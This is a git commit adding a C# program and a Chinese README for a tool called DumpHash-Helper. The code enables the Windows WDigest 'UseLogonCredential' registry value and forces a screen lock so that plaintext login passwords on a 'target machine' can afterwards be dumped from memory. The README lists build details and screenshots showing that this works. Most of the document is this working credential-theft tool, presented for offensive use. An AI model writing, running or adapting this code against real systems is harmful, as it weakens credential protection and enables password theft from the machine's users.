e4a93505ae847ae87e73201a65d3d400b8194025
evilAdan0s <eviladan0s@gmail.com>
2020-12-03 22:50:11 +0800

    1,0

---
+++ DumpHash-Helper/DumpHash-Helper/Program.cs
@@ -0,0 +1,74 @@
+﻿using System;
+using Microsoft.Win32;
+using System.Runtime.InteropServices;
+
+namespace DumpHash_Helper
+{
+    class Program
+    {
+        [DllImport("user32.dll")]
+        public static extern bool LockWorkStation();
+
+        static void Main(string[] args)
+        {
+            Program program = new Program();
+            RegistryKey wdigest;
+            object key;
+            key = program.checkReg(out wdigest);
+            if (program.setReg(key, wdigest) == true)
+            {
+                if ((int)program.checkReg(out wdigest) == 1)
+                {
+                    Console.WriteLine("[*] Bingo!");
+                    LockWorkStation();
+                }
+                else
+                {
+                    Console.WriteLine("[!] Can't update the Reg......");
+                }
+            }
+            else
+            {
+                Console.WriteLine("[!] Something Wrong......");
+            }
+        }
+
+        private object checkReg(out RegistryKey wdigest)
+        {
+            object key;
+            
+            RegistryKey hkml = Registry.LocalMachine;
+            RegistryKey system = hkml.OpenSubKey("System", true);
+            RegistryKey currentControlSet = system.OpenSubKey("CurrentControlSet", true);
+            RegistryKey control = currentControlSet.OpenSubKey("Control", true);
+            RegistryKey securityProviders = control.OpenSubKey("SecurityProviders", true);
+            wdigest = securityProviders.OpenSubKey("WDigest", true);
+            key = wdigest.GetValue("UseLogonCredential");
+            return key;
+        }
+
+        private bool setReg(object key, RegistryKey wdigest)
+        {
+            try
+
+            {
+                if (key == null | (int) key == 0)
+                {
+                    wdigest.SetValue("UseLogonCredential", 1, RegistryValueKind.DWord);
+                    wdigest.Close();
+                    return true;
+                }
+                else
+                {
+                    return true;
+                }
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("[!] ERROR: "+ e.Message);
+                return false;
+            }
+        }
+        }
+    
+    }
--- README.md
+++ README.md
@@ -1,2 +1,28 @@
 # DumpHash-Helper
-使用Csharp实现自动修改注册表键并强制锁屏，使其可被抓取明文密码。
+使用Csharp实现自动修改注册表键并强制锁屏，使目标机器可被抓取明文密码。
+
+编译环境：
+- MacOS 10.14 
+- Rider 2020
+- .Net Framework 4.8
+- SDK 5.0.100
+
+测试环境：
+- Windows 7 Pro x64
+
+**需要本地管理员权限**
+
+练习作品，代码略丑。
+
+# 演示
+目标机不可抓取明文：
+![20201203224538ggK8Ob](https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20201203224538ggK8Ob.png)
+
+注册表项：
+![20201203224623yaKYBZ](https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20201203224623yaKYBZ.png)
+
+管理员权限运行软件，自动锁定屏幕：
+![20201203224743hw4pDM](https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20201203224743hw4pDM.png)
+
+可以抓取明文，注册表键值已改变：
+![20201203224925c4UWpr](https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20201203224925c4UWpr.png)
